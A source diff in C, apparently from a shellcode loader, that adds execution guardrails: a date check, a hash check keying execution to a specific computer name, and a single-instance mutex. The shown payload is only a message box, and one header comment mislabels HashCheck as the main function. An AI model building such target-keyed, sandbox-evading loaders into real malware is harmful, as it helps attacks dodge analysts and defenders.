@@ -36,25 +36,47 @@ void CheckExecution() {
 	// date, return now
 	if (!DateTimeCheck()) return;
 
+	// Check the hash of the computer name against the stored hash.
+	// If they are different, return now
+	if (!HashCheck()) return;
+
+	// Perform the Mutex check; if it is already running, quit now
+	if (!MutexCheck(MUTEX_NAME)) return;
+
+	MessageBox(NULL, "Runs", NULL, NULL);
+	return;
+}
+
+
+//////////////////////////////////////////////////////////////////////////////////
+//
+//   HashCheck
+//   The main function; it performs the various checks and actions
+//   and will execute the shellcode if applicable
+//
+//////////////////////////////////////////////////////////////////////////////////
+
+unsigned int HashCheck() {
+	HGLOBAL *cn;
+	HGLOBAL *cnhash;
+	unsigned int ret;
+
+	ret = FALSE;
+
 	// Check the hash of the computer name
 	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
 		if (cnhash = GenerateHash(cn, strlen(cn))) {
 			if (!memcmp(cnhash, &hashSHA1ComputerName, hashSHA1ComputerNamelen)) {
-				MessageBox(NULL, TEXT("They match"), NULL, NULL);
-			} else {
-				MessageBox(NULL, TEXT("They are different"), NULL, NULL);
+				ret = TRUE;
 			}
 			free(cnhash);
 		}
 		free(cn);
 	}
-	
 
-	// Perform the Mutex check; if it is already running, quit now
-	if (!MutexCheck(MUTEX_NAME)) return;
-
-	return;
+	return ret;
 }
+
 
 
 //////////////////////////////////////////////////////////////////////////////////
